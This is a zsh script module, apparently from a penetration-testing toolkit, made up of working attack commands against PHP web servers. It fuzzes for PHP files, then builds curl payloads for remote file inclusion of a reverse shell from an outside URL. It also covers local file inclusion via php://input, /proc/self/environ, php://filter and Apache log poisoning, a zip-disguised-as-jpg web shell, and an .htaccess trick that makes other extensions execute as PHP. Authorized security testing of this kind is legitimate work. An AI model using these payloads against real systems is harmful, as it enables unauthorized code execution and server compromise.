#!/usr/bin/env zsh

############################################################# 
# nb-enum-web-php
#############################################################
nb-enum-web-php-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-web-php
----------------
The nb-enum-web-php namespace contains commands for discovering web content, directories and files
on PHP web servers

Commands
--------
nb-enum-web-php-install                 installs dependencies
nb-enum-web-php-ffuf                    scan for PHP files
nb-enum-web-php-rfi                     exploit typical RFI params
nb-enum-web-php-rfi-input               exploit LFI params with input
nb-enum-web-php-lfi-proc-self-environ   exploit LFI params with self environment
nb-enum-web-php-lfi-filter-resource     exploit LFI params with filter resource
nb-enum-web-php-lfi-zip-jpg-shell       exploit LFI params for zip-jpg shell
nb-enum-web-php-lfi-logfile             exploit LFI params with logfile
nb-enum-web-php-gen-htaccess            generate an htaccess file
nb-enum-web-php-phpinfo                 generate phpinfo payload

DOC
}

nb-enum-web-php-install() {
    __info "Running $0..."
    __pkgs curl seclists wordlists
    nb-install-golang
    go get -u github.com/ffuf/ffuf
    go get -v -u github.com/tomnomnom/httprobe
}

nb-enum-web-php-ffuf() {
    __check-project
    nb-vars-set-url
    nb-vars-set-wordlist
    __check-threads
    local d && __askvar d "RECURSION DEPTH"
    print -z "ffuf -p 0.1 -t ${__THREADS} -recursion -recursion-depth ${d} -H \"User-Agent: Mozilla\" -fc 404 -w ${__WORDLIST} -u ${__URL}/FUZZ -e ${__EXT_PHP} -o $(__urlpath)/ffuf-dirs-php.csv -of csv"
}

nb-enum-web-php-rfi() {
    __ask "URL should contain a URI like /page.php?rfi="
    nb-vars-set-url
    __ask "PAYLOAD URL should contain reverse php shell"
    local p && __askvar p PAYLOAD_URL
    print -z "curl -k -v -XGET \"${__URL}${p}%00\" "
}

nb-enum-web-php-rfi-input() {
    __ask "URL should contain a URI like /page.php?rfi="
    nb-vars-set-url
    print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${__URL}php://input%00\" "
}

nb-enum-web-php-lfi-proc-self-environ() {
    __ask "URL should contain a URI like /page.php?lfi="
    nb-vars-set-url
    print -z "curl -k -v -A \"<?=phpinfo(); ?>\" \"${__URL}../../../proc/self/environ\" "
}

nb-enum-web-php-lfi-filter-resource(){
    __ask "URL should contain a URI like /page.php?lfi="
    nb-vars-set-url
    __ask "Set path to a remote file"
    local f && __askvar f REMOTE_FILE
    print -z "curl -k -v -XGET \"${__URL}php://filter/convert.base64-encode/resource=${f}\" "
}

nb-enum-web-php-lfi-zip-jpg-shell() {
    __ask "URL should contain a URI like /page.php?lfi="
    nb-vars-set-url

    echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
    zip payload.zip payload.php
    mv payload.zip shell.jpg

    __info "Created shell.jpg"
    __warn "First upload shell.jpg to target"

    print -z "curl -k -v -XGET \"${__URL}zip://shell.jpg%23payload.php?cmd=\" "
}

nb-enum-web-php-lfi-logfile() {
    __ask "URL should contain a URI like /page.php?lfi="
    nb-vars-set-url
    local b && __askvar b "TARGET URL"
    curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
    __info "lfi request completed"
    print -z "curl -k -v \"${__URL}../../../../../var/log/apache2/access.log&cmd=whoami\" "
}

nb-enum-web-php-gen-htaccess() {
    local e && __askvar e Extension
    __ask "Upload .htaccess file to make alt extension executable by PHP"
    print -z "echo \"AddType application/x-httpd-php ${e}\" > htaccess"
}

nb-enum-web-php-phpinfo() {
    print -z "echo \"<html><body><p>PHP INFO PAGE</p><br /><?php phpinfo(); ?></body></html>\" > phpinfo.php"
}
